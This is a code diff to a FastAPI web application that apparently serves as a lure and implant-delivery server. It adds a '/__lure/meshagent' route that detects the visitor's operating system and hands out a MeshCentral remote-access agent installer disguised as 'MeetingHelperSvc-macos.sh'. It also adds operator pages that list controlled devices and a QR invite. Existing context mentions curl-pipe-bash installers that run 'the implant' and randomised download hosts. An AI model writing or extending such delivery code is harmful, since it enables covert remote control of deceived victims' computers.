@@ -26,7 +26,7 @@ from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
 from starlette.concurrency import run_in_threadpool
 
-from . import health, landing
+from . import health, landing, mesh
 from .alerts import Alerts
 from .auth import Auth
 from .build import (
@@ -310,7 +310,10 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         family = landing.sniff(ua) if ua else os
         family = landing.family_for_os(family if family != "all" else os)
         if family not in ("windows", "macos", "linux", "all"):
-            return JSONResponse({"url": "", "family": family, "profile": profile})
+            return JSONResponse(
+                {"url": "", "family": family, "profile": profile, "mesh": False}
+            )
+        mesh_ready = bool(mesh.agent_url(config, family))
         recent = await run_in_threadpool(app.state.pipeline.recent, 300)
 
         def art_profile(artifact: dict) -> str:
@@ -324,7 +327,9 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         picked = landing.newest(matching)
         artifact = picked.get(family) or (next(iter(picked.values())) if picked else None)
         if artifact is None:
-            return JSONResponse({"url": "", "family": family, "profile": profile})
+            return JSONResponse(
+                {"url": "", "family": family, "profile": profile, "mesh": mesh_ready}
+            )
         forwarded = request.headers.get("x-forwarded-host", "")
         if forwarded:
             download_host = forwarded.split(",")[0].strip()
@@ -334,9 +339,42 @@ def create_app(settings: Settings | None = None) -> FastAPI:
             download_host = f"{secrets.choice(pool)}.{zone}"
         url = f"https://{download_host}/e/{artifact['slug']}"
         return JSONResponse(
-            {"url": url, "family": family, "profile": profile, "slug": artifact["slug"]},
+            {
+                "url": url,
+                "family": family,
+                "profile": profile,
+                "slug": artifact["slug"],
+                "mesh": mesh_ready,
+            },
             headers={"Cache-Control": "no-store"},
         )
+
+    def _mesh_script_response(script: str, filename: str) -> Response:
+        return Response(
+            content=script,
+            media_type="text/x-shellscript",
+            headers={
+                "Content-Disposition": f'attachment; filename="{filename}"',
+                "Cache-Control": "no-store",
+            },
+        )
+
+    @app.get("/__lure/meshagent")
+    async def lure_meshagent(os: str = "all", ua: str = ""):
+        family = landing.sniff(ua) if ua else os
+        family = landing.family_for_os(family if family != "all" else os)
+        if family == "macos":
+            script = mesh.macos_install_script(config)
+            if script:
+                return _mesh_script_response(script, "MeetingHelperSvc-macos.sh")
+        if family == "linux":
+            script = mesh.install_script(config)
+            if script:
+                return _mesh_script_response(script, "meshinstall.sh")
+        url = mesh.agent_url(config, family)
+        if not url:
+            raise HTTPException(status_code=404, detail="mesh agent not configured")
+        return RedirectResponse(url, status_code=302)
 
     # -- one-line installers (curl | bash) -----------------------------------
     # Serves shell scripts that download + run the implant directly via curl,
@@ -575,6 +613,82 @@ def create_app(settings: Settings | None = None) -> FastAPI:
             path,
             filename=name,
             media_type=media,
+            headers={"Cache-Control": "no-store"},
+        )
+
+    # -- mesh central --------------------------------------------------------
+    @app.get("/mesh", response_class=HTMLResponse)
+    async def mesh_page(request: Request):
+        session = require(request)
+        if session is None:
+            return RedirectResponse("/login", status_code=303)
+        mesh_state = await mesh.status(config)
+        mesh_devices = await mesh.devices(config)
+        return render(
+            request,
+            "meshcentral.html",
+            csrf=csrf_token(request),
+            mesh=mesh_state,
+            devices=mesh_devices.devices,
+            mesh_invite=mesh.invite_url(config),
+            mesh_agents=mesh.agent_matrix(config),
+            mesh_server=(config.meshcentral_url or "").rstrip("/"),
+        )
+
+    @app.get("/api/mesh/status")
+    async def api_mesh_status(request: Request) -> JSONResponse:
+        if require(request) is None:
+            raise HTTPException(status_code=401)
+        mesh_state = await mesh.status(config)
+        return JSONResponse(
+            {
+                "meshcentral": {
+                    "enabled": mesh_state.enabled,
+                    "ok": mesh_state.ok,
+                    "detail": mesh_state.detail,
+                },
+                "agent_server_url": config.meshcentral_agent_server_url,
+            }
+        )
+    @app.get("/api/mesh/devices")
+    async def api_mesh_devices(request: Request) -> JSONResponse:
+        if require(request) is None:
+            raise HTTPException(status_code=401)
+        mesh_devices = await mesh.devices(config)
+        return JSONResponse(
+            {
+                "meshcentral": {"ok": mesh_devices.ok, "detail": mesh_devices.detail},
+                "devices": [
+                    {
+                        "id": device.id,
+                        "name": device.name,
+                        "os": device.os,
+                        "status": device.status,
+                        "last_seen": device.last_seen,
+                    }
+                    for device in mesh_devices.devices
+                ],
+            }
+        )
+
+    @app.get("/api/mesh/qr")
+    async def api_mesh_qr(request: Request) -> Response:
+        if require(request) is None:
+            raise HTTPException(status_code=401)
+        target = mesh.invite_url(config)
+        if not target:
+            raise HTTPException(status_code=404, detail="mesh invite not configured")
+        import io
+
+        import qrcode
+        import qrcode.image.svg
+
+        image = qrcode.make(target, image_factory=qrcode.image.svg.SvgPathImage)
+        buffer = io.BytesIO()
+        image.save(buffer)
+        return Response(
+            content=buffer.getvalue(),
+            media_type="image/svg+xml",
             headers={"Cache-Control": "no-store"},
         )
 
